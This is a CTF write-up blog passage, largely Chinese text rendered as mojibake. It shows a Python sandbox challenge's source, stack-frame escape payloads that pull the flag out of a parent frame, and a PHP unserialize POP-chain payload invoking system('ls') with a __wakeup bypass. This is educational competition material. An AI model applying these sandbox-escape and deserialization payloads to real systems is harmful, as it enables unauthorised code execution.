<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>runner.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™ runtime ä½ å°±å˜å˜å†™å§ï¼Œ ä¸€å†™ä¸€ä¸ªä¸å±å£°å•Šï¼Œç‚¹å„¿éƒ½æ²¡æ‹¦ä½ï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>pyæ ˆå¸§é€ƒé€¸</p>
<p><a class="link"   href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG==uh8kAhiD&alichlgref=https://www.cnblogs.com/" >Pythonåˆ©ç”¨æ ˆå¸§æ²™ç®±é€ƒé€¸ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>è¿™é¢˜çš„flagåœ¨æ²™ç®±çš„ä¸Šä¸Šä¸Šå¸§ï¼ˆè‡ªå·±æ„é€ çš„ä¸¤ä¸ªå‡½æ•°ä¸¤å¸§ï¼Œexecé‡Œçš„ä¸€å¸§ï¼‰</p>
<p>è·å–ä¸Šä¸Šå¸§å¯¹è±¡çš„ä¸‰ç§æ–¹å¼</p>
<ol>
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªæ–¹æ³•ä¸è¡Œï¼Œä½¿ç”¨nextè·å–æ ˆå¸§å¯¹è±¡ä¼šè®©ç»“æœåŒ…å«LOAD_GLOBAL</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]<span class="comment">#ç”¨è¿™&lt;listcomp&gt;éœ€è¦å¤šé€ƒä¸€å¸§</span></span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"> <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line"> pop = exp()</span><br><span class="line"> <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line"> boo=exp</span><br><span class="line"> <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br></pre></td></tr></table></figure>

<p>æœ€åè¿˜ä½œäº†ä¸ªæ£€æµ‹ï¼Œå°±æ˜¯flagä¸èƒ½å­˜åœ¨outputä¸­</p>
<p>è¿™é‡Œä¹Ÿæœ‰ä¸¤ç§ç»•æ³•</p>
<p>payload1:<code>print(kino.f_code.co_consts[16][1:])</code></p>
<p>æˆªå–å­—ç¬¦ä¸²ç»•è¿‡ï¼Œæˆ‘è¿™é‡Œç”¨çš„ctfshowå¤ç°çš„ç¯å¢ƒï¼Œå‰é¢è¿™ä¸ªä¸‹æ ‡æ˜¯16</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240524180044325.png"  alt="image-20240524180044325"></p>
<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">payload = &#x27;&#x27;&#x27;def getflag():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame=[x for x in g][0]</span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]  </span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code </span><br><span class="line">    gattr_dir = gattr.dir</span><br><span class="line">    s  = gattr.str</span><br><span class="line">    print(gattr_dir(code))</span><br><span class="line">    for i in s(code.co_consts):</span><br><span class="line">        print(i,end=&quot;,&quot;)</span><br><span class="line">getflag()&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;code&quot;: payload</span><br><span class="line">&#125;</span><br><span class="line">print(json.dumps(data))</span><br></pre></td></tr></table></figure>

<p>å…ˆç”¨builtinsè·å–strï¼Œç„¶åæŠŠcode.co_constså˜ä¸ºå­—ç¬¦ä¸²åè¾“å‡ºï¼Œæ¯éš”ä¸€ä¸ªå­—ç¬¦ç”¨ï¼Œéš”å¼€å³å¯</p>
<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240527172754306.png"  alt="image-20240527172754306"></p>
<p>ä½ çŸ¥é“çš„ï¼Œjdbcçš„æ”»å‡»åŸºæœ¬æ˜¯å›´ç»•ç€é©±åŠ¨æ¥æ”»å‡»çš„</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527172840785.png"  alt="image-20240527172840785"></p>
<p>æä¾›å››ä¸ªé©±åŠ¨ï¼Œä¸€ä¸ªä¸€ä¸ªå¯»æ‰¾æ¼æ´æ¡ä»¶</p>
<p>ç¬¬ä¸€ä¸ªMysqlï¼Œæˆ‘çŸ¥é“çš„å°±ååºåˆ—åŒ–æ¼æ´ï¼Œçœ‹çœ‹ç‰ˆæœ¬</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173431572.png"  alt="image-20240527173431572"></p>
<p>no</p>
<p>ç¬¬äºŒä¸ªPostgreSQLï¼Œæ§åˆ¶bean.xmlè¿›è¡Œrce</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173557400.png"  alt="image-20240527173557400"></p>
<p>no</p>
<p>ç¬¬ä¸‰ä¸ªæ˜¯sqliteæœåŠ¡</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527203847332.png"  alt="image-20240527203847332"></p>
<p><img   src="/../img/$%7Bfiilename%7D/1f913.png"  alt="ğŸ¤“ä¹¦å‘†å­è„¸:é«˜æ¸…å¤§å›¾ä¸Unicodeä¿¡æ¯ | EmojiAll"></p>
<p>å¯¹å•¦ï¼</p>
<p>[é¡¹ç›®æ–‡ä»¶é¢„è§ˆ - GitCode](<a class="link"   href="https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;PostGreSQL&#x2F;index.md?utm_source&#x3D;csdn_github_accelerator&amp;isLogin&#x3D;1)</p>
<p><a class="link"   href="https://gitcode.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java" >é¡¹ç›®æ–‡ä»¶é¢„è§ˆ - JDBC-Attack - GitCode<i class="fas fa-external-link-alt"></i></a></p>
<p>å¤ç°å¤ªéº»çƒ¦äº†ï¼ŒåŒ…æ‹¬ç¯å¢ƒä¸‹è½½ï¼Œç„¶åè¿˜æœ‰è¿œç¨‹debugï¼Œè¿™äº›éƒ½å¥½éš¾å¼„ï¼ŒåªæŒ‰wpåšäº†ä¸€æ¬¡</p>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>å¥¶å¥¶æ»´ä¸´è¿‘æœŸæœ«ï¼Œå†™ä¸ªå¤ç°éƒ½è¦å†™å‡ å‘¨ï¼Œè¿˜æœ‰ä¸€é¢˜sanicæ²¡çœ‹ï¼Œæˆ‘å˜ä¸ªå¿™</p>
<p>èµ›åå¤ç°èµ›é¢˜å‘ç°æˆ‘çš„å¤ç°èƒ½åŠ›å¤ªå·®äº†ï¼Œç¯å¢ƒä¸ä¼šè£…ï¼Œdockerä¸ä¼šç”¨ï¼Œdebugä¸ä¼šdebugï¼Œç´¯äº†</p>
<p>æ¥ä¸‹æ¥å°±å­¦å­¦å¤ç°ç¯å¢ƒå§ï¼Œä»vulhubå¼€å§‹ï¼Œç„¶åä¸€ç‚¹ä¸€ç‚¹å­¦ç€è°ƒè¯•ï¼Œåˆ†æï¼Œè¿™åº”è¯¥åº”è¯¥è¿˜ç®—ä¸ªç¾å¦™çš„è¿‡ç¨‹</p>
<p>æˆ‘åœ¨å¤ç°thinkphpçš„æ—¶å€™è°ƒè¯•çš„æ—¶å€™å°±è°ƒè¯•å¾—æˆ‘æŒºç¾çš„</p>
<p>æœŸè€ƒï¼Œä¼šèµ¢å—ï¼Ÿ</p>
<p><img   src="/../img/$%7Bfiilename%7D/OIP-C.mG6e-yzRUBIZy6otnpkH1wAAAAw=169&h=197&c=7&r=0&o=5&dpr=1.7&pid=1.jpeg"  alt="ä¼šèµ¢çš„äº”æ¡æ‚Ÿ çš„å›¾åƒç»“æœ"></p>
<p>è¿˜æœ‰æµ·å¤§ä½ æ— æ•Œäº†ï¼Œæš‘å‡æ‰æ”¾ä¸€ä¸ªæœˆåŠ</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>å¤ç°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HDCTF Junior 2024 Winter WP</title>
    <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
    <content><![CDATA[<h1 id="æ–°ç”Ÿé€‰æ‹”èµ›"><a href="#æ–°ç”Ÿé€‰æ‹”èµ›" class="headerlink" title="æ–°ç”Ÿé€‰æ‹”èµ›"></a>æ–°ç”Ÿé€‰æ‹”èµ›</h1><span id="more"></span>

<h1 id="æœ´å®æ— åçš„http"><a href="#æœ´å®æ— åçš„http" class="headerlink" title="æœ´å®æ— åçš„http"></a>æœ´å®æ— åçš„http</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240222183840891.png" ></p>
<p>è¿™æ˜¯åˆšåˆšæ‹¿åˆ°é¢˜çš„æ ·å­,F12æ²¡ååº”,ctrl+Uçœ‹çœ‹</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222183956685.png" ></p>
<p>æ²¡ä»€ä¹ˆåµç”¨,åªçŸ¥é“æŠŠF12å’ŒF1 banæ‰äº†</p>
<p>é¢˜ç›®æ²¡ç»™ä»€ä¹ˆæè¿°,æºç ä¹Ÿæ²¡æœ‰ä¿¡æ¯,ç›´æ¥å¼€æ‰«,dirsearch.pyå¯åŠ¨!</p>
<p>æœ€åæ‰«å‡ºæ¥ä¸ªrobot.txt</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184449835.png" ></p>
<p>è¿›å…¥ä½ ï¼Œhttttttp.php</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184604048.png" ></p>
<p>æ¥ä¸‹æ¥å°±å¾ˆå¸¸è§„çš„æŠŠReferer,UAå¡«å¥½,å°±è¿›å…¥äº†ç»å…¸è¯•ipç¯èŠ‚,ç”¨æ”¶é›†çš„è¯å…¸åœ¨burpsuiteçˆ†ä¸€ä¸‹å°±å‡ºæ¥äº†.</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185535104.png"  alt="å…„å¼Ÿçˆ†ä¸€ä¸‹ï¼Œè¯´è¯´ä½ å¿ƒé‡Œè¯"></p>
<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>æœ€æƒ³åçš„ä¸€é›†ï¼Œè™½ç„¶æ‹¿äº†ä¸ªä¸€è¡€ï¼Œä½†è¿™é¢˜å·®ç‚¹æŠŠæˆ‘è¡€éƒ½æ”¾å®Œäº†</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185800522.png" ></p>
<p>å› ä¸ºä¸€å¼€å§‹æœåŠ¡å™¨æŒºå¡çš„ï¼Œç‚¹è¿™é¢˜è€æ˜¯è°ƒåˆ°åˆ«çš„åœ°æ–¹ï¼Œæˆ‘è¿˜ä»¥ä¸ºé¢˜ç›®å‡ºé”™äº†ï¼Œä¸€çœ‹åŸæ¥æœ‰ä¸ª$_GET[â€˜entranceâ€™]ï¼Œå¤Ÿåå“ˆ</p>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿™é¢˜çš„æ€è·¯åˆ°æ˜¯æ¯”è¾ƒæ˜ç¡®ï¼Œæƒ³å‡ºæ¥å¹¶ä¸è¦å¤šå°‘æ—¶é—´,æ¼æ´ç‚¹æ˜¯åœ¨$fuction($cmd),äºæ˜¯æˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªå€¼è¿›è¡Œè¦†ç›–å³å¯rceï¼Œ</p>
<p>é‚£ä¹ˆå°±åæ¨å›å»</p>
<p>ä»€ä¹ˆèƒ½è§¦å‘invokeå‘¢â€”&gt;damnç±»ä¸­çš„toStringå¯ä»¥è§¦å‘,ä»€ä¹ˆè§¦å‘toStringâ€”&gt;ç±»popçš„setï¼Œä»€ä¹ˆè§¦å‘setâ€”&gt;ç±»airçš„call,ä»€ä¹ˆè§¦å‘callâ€”&gt;ç±»hnusecçš„destruct</p>
<p>å¼€å§‹ä¸‹æ‰‹</p>
<h2 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h2><p>è¿™é‡Œçš„base64è§£ç ç¼–ç ï¼Œprivateå˜é‡æ—è¾¹çš„%00å¼„å¾—æˆ‘å¥½å´©æºƒ.</p>
<p>å…ˆçœ‹æˆ‘çš„payload:</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222190634907.png" ></p>
<p>$b&#x3D;â€™O:6:â€hnusecâ€:2:{s:3:â€expâ€;O:3:â€airâ€:1:{s:3:â€expâ€;O:3:â€popâ€:2:{s:8:â€%00pop%00expâ€;N;s:4:â€exp2â€;O:18:â€damndamndamdanmdanâ€:1:{s:3:â€expâ€;O:7:â€exploitâ€:2:{s:8:â€functionâ€;s:6:â€systemâ€;s:3:â€cmdâ€;s:2:â€lsâ€;}}}}}â€™</p>
<p>ä»¥ä¸ºåˆ°è¿™é‡Œå°±å·®ä¸å¤šå¾—äº†?æƒ³å¤šäº†</p>
<h2 id="ç»•è¿‡wakeup"><a href="#ç»•è¿‡wakeup" class="headerlink" title="ç»•è¿‡wakeup"></a>ç»•è¿‡wakeup</h2><p>è¿™ä¸ªéœ€è¦ç‰ˆæœ¬é™åˆ¶ï¼Œå…·ä½“ä¸è®°å¾—</p>
<p>æˆ‘ä»¬çŸ¥é“wakeupè§¦å‘æ—¶æœºæ˜¯åœ¨unserializeä¹‹å‰ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬è‚¯å®šä¸èƒ½è®©å®ƒè§¦å‘.</p>
<p>ç»•è¿‡çš„æ–¹å¼æ˜¯:ä¿®æ”¹popé“¾å±æ€§ä¸ªæ•°ä½¿ä»–å¤§äºçœŸå®ä¸ªæ•°å³å¯ç»•è¿‡</p>
<h2 id="privateæ—è¾¹çš„-00"><a href="#privateæ—è¾¹çš„-00" class="headerlink" title="privateæ—è¾¹çš„%00"></a>privateæ—è¾¹çš„%00</h2><p>è¿™é‡Œå¤Ÿæˆ‘å–ä¸€å£¶çš„äº†</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222191033249.png" ></p>
<p>æ³¨æ„çœ‹ï¼Œè¿™ä¸ªå˜é‡å«pop,å®ƒçš„ä¸¤è¾¹æœ‰ä¸¤ä¸ªä¸çŸ¥é“ä»€ä¹ˆä¸œè¥¿çš„ä¸œè¥¿,å…¶å®å®ƒæ˜¯ASCIIé‡Œé¢çš„0ï¼Œåœ¨urlä¸­æ˜¯%00.</p>
<p>æŒ‰æˆ‘ä¹‹å‰çš„ç»éªŒæ¥çœ‹ï¼Œæˆ‘ä»¬åªéœ€æ‰‹åŠ¨æ·»åŠ %00åœ¨popä¸¤è¾¹ï¼Œæ¥ç€$_GETä¼ å‚å³å¯,ä½†æ˜¯ä½ å…ˆåˆ«æ€¥</p>
<p>è¿™é‡ŒGETä¼ è¿›å»çš„popé“¾æ˜¯è¦ç»è¿‡base64ç¼–ç è§£ç çš„ï¼Œäºæ˜¯åƒä¸Šé¢è¯´çš„è¿™æ ·å­å¹²ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥çš„ä¾¿æ˜¯%00,è€Œä¸æ˜¯ç»è¿‡æœåŠ¡å™¨è§£æåçš„é‚£ä¸ªç¬¦å·0,æ‰€ä»¥phpç†æ‰€å½“ç„¶æ˜¯è¯†åˆ«ä¸äº†%00çš„ï¼Œæ‰€ä»¥è¯†åˆ«ä¸äº†popï¼Œä¸€ä¸ªåœ°æ–¹å´©æ•´ä¸ªå´©</p>
